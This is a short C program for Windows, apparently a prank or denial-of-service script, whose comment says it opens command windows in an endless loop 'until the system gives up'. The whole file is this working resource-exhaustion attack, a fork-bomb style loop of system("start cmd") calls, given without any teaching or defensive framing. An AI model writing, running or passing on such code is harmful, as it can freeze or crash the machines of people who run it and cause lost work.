// Opens CMD windows in an infinite loop until the system gives up. Windows only.
#include <stdlib.h>

main(){
    while(1){
        system("start cmd");
    }
}
